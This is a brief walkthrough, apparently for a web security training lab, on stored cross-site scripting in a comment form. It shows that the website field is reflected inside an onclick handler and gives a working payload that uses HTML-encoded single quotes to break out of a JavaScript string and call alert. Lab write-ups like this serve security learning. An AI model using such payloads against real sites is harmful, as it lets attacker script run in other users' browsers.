Title: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Level: PRACTITIONER
Desc:  This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

# Walkthrough:


<img width="634" height="471" alt="image" src="https://github.com/user-attachments/assets/8bb17987-9422-40fb-951b-bf763c583df5" />
string provided by website field is reflected on : 
`<a id="author" href="https://website.com" onclick="var tracker={track(){}};tracker.track('https://website.com');">`

payload to make this work: `http://foo?&apos;-alert(1)-&apos;` (add to website and url encode in burp)


